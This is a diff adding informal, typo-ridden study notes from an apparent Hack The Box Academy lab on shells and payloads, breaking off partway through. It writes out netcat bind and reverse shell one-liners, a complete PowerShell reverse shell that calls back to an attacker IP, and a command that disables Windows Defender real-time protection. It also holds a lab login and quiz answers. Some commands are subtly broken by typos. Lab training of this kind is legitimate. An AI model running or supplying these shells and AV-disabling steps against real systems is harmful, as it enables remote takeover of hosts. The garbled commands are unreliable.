@@ -1,0 +1,126 @@
+Shell Jack Us In, Payloads Deliver Us shells
+./followthegreencube.sh
+-Shell is a program that provides a comp user with an interface to input instruction int the sys and view text out put (Bash, Zsh, cmd, and Powershell,..)
+-a shell is often the result of exploiting a vul or bypassing security measures to gain interactive access to a host. we may have heard or read the following phrase used by people discusing an engagement or a recent practice sessiong
+-remote shell = success pentest this is outcome after enumeration and identification of promissing exploits
+\\Why Get a Shell?
+-the shell gives us direct access to the OS, system commands, and file system, if we gain access we can start enum the system for vectors that may allow us to escalate privileges, pivot, transfer files, ....
+-establishing a shell also allows us to maintain persistence on the sys, give us more time to work, it can make it easier to use our atk tools exfiltrate data, gather, store and doc all the details of our atk.
+-shell is more invisible than VNC, RDP harder to detect than graphical shells, faster to navigate the OS, and easier to automate our actions
+Perspective	Description
+Computing	The text-based userland environment that is utilized to administer tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and PowerShell.
+Exploitation & Security	A shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. An example would be triggering EternalBlue on a Windows host to gain access to the cmd-prompt on a host remotely.
+Web	This is a bit different. A web shell is much like a standard shell, except it exploits a vulnerability (often the ability to upload a file or script) that provides the attacker with a way to issue instructions, read and access files, and potentially perform destructive actions to the underlying host. Control of the web shell is often done by calling the script within a browser window.
+\\Payloads Deliver us Shells.
+
+Within the IT industry as a whole, a payload can be defined in a few different ways:
+
+Networking: The encapsulated data portion of a packet traversing modern computer networks.
+Basic Computing: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
+Programming: The data portion referenced or carried by the programming language instruction.
+Exploitation & Security: A payload is code crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.
+\\CAT5 Security Engagement Preparation
+-pentester working for CAT5 Security, and we are preparing to perform an engagement for our client inlanefreigh. the more senior team members at CAT5 want to see our skill with shell & payloads before inlcuding us in the live engagement
+\\Shell UseBasicParsing
+-replicate being able to get a bind and reverse shell
+-Bind Shell on Linux host
+-Reverse Shell on Windows Host
+\\Payload UseBasicParsing
+-Demo lauching a payload from MSF 
+-Demo searching and building a payload from PoC on ExploitDB
+-Demo Knowledge of payload creation,
+\\Getting a Shell on Windows
+-Using the recon results provided, craft or use a payload that will exploit the host and provide a shell background
+\\Getting a shell on Linux
+-Using the recon results provided, craft or use a payload to exploit the host and eastablish a shell session
+\\Landing a Web Shell
+-Demo knowledge of web shells and common web app by identifyin a common web app and its corressponding language
+-using a recon reslt , deloy a pyload that provide shell access from browser
+\\Spotting a Shell or Payload 
+$env $ps
+\\===========================
+Bind Shells
+target sys has a listenter and awaits a connection
+\\Practicing with GNU Netcat
+\\1 Server - Target starting Netcat listener
+$nc -lvnp 7777  -> waiting for client to connect
+\\2 client - connect to target
+$nc -nv 10.129.41.200 7777
+\\3 Server - Target receiving connection from client
+$nc -lvnp 7777
+that is not proper shell. it just a Netcat TCP session established.
+\\4 Client- Attack box sending message hello academy
+$nc -nv 10.129.41.200 7777
+\\5 Server - Target receiving Hello Academy message
+$nc -lvnp 7777
+NOTE: when on the academy network (10.129.x.x/16) we can work with another academy student to conn to their target box and pratice the concepts presentad in this module
+\\Establishing a Basic Bind Shell with Netcat
+Netcat not actual shell it only TCP session, only able to pass text within the pipe setup by netcat. let use Netcat to serve up our shell to establish a real bind shell
+-on svr site we will need to specify the dir, shell, listener, work with some pipelines, and input & output redirectin. to ensure a shell to sys get served when the client attemps to conn
+\\1. Server- Binding a Bash shell to the TCP session
+$rm -f /tmp/f; mkfifo /tmp/f; cat/tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f 
+this diff depend on OS
+\\2 Client - conn to bind shell on target
+$nc -nv 10.129.41.200 7777
+\\======================================
+Reverse Shells
+-the atk box will have a listener running and target will need to initiate the conn
+exploit some vuls like unrestricted file upload, command injection,etc,..) to force the target to initiate a conn with our target box, effectively meaning our atk box becomes the server and the target becomes the client
+-utilize payload reverse at: 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+-incase admin known the pyaload and implement defend let customize the payload
+\\Hands-on With A Simple Reverse Shell in Windows
+(Server Attack box) $sudo nc -lvnp 443
+-firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port.
+- try to utilize the living off the land on target sstem to gain access to
+\\What applications and shell languages are hosted on the target?
+\\Client (target)
+PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+-incase AV blocking try to run as admin
+\\Disable AV
+$Set-MpPreference -DisableRealtimeMonitoring $true   -> once AV is disabled attempt to execute the code again
+\\Server (attack box)
+$sudo nc -lvnp  443
+10.129.20.51 htb-student HTB_@cademy_stdnt!
+<test>When establishing a reverse shell session with a target, will the target act as a client or server?
+client
+<test>Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.
+
+$$xfreerdp /v:<ip> /u:htb-student /p:<password>
+10.10.15.40
+\\\\\\\\\\\\\\\\\===========================================
+Introduction to Payloads
+\\have you ever sent an email or text to someone?
+-in information security the payload is the command and/or code that exploit the vul in an OS and/or application.
+-the payload is the command and/or code that performs the malicious action from a defensive per,
+-when deliver and execute payloads, just like any other program, we give the target comp instructions on what it need to do. 
+-the terms "malware" and " malicious code" romanticzie the process and make it more mysterious than it is/
+\\One-Liners Examined
+\\Netcat/Bash Reverse Shell One-liner
+$rm -f /tmp/f; mkinfo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f 
+common one-liner issued on a linux system to serve a Bash shell on a network socket utilizing a Netcat listener.
+\\Remove /tmp/F
+rm -f /tmp/f;
+removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequently
+\\MAke A Named Pipe
+$mkfifo /tmp/f 
+-Make a https://man7.org/linux/man-pages/man7/fifo.7.html at the location specified, /tmp/f is the FIFO named pipe file, the semi-colon(;) is used to execute the command sequently
+\\Output redirection
+$cat /tmp/f |
+-Concatenates the FIFO named pipe file /tmp/f, the pipe (|) conn the standard output of cat /tmp/f to te standard input of the commnd that comes after the pipe (|)
+\\Set Shell options
+$/bin/bash -i 2>&1 | 
+Specifies the cmd language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2)& standard output data stream (1) are redirected to the cmd following the pipe ([])
+\\Open a Connection with Netcat
+$nc 10.10.14.12 7777 > /tmp/f 
+-Uses Netcat to send a conn to atk host port, the output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner cmd is executed
+\\PowerShell One-Liner Explained
+$powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+\\Calling PowerShell
+PS> powershell -nop -c 
+-execute Ps with no profile (nop) and executes the cmd/script block (-c) contained in the quotes.this particular cmd is issued inside of command-prompt, 
+\\Binding A socket
+"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
+-Set/eval the variable $client equal to (=) the Net-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will conn with the TCP socket listed in the parentheses (10.10.14.158,443) the semi-colon(;) ensure the cmd & code are executed sequently
+\\Setting the command stream
+$stream = $client.GetStream();
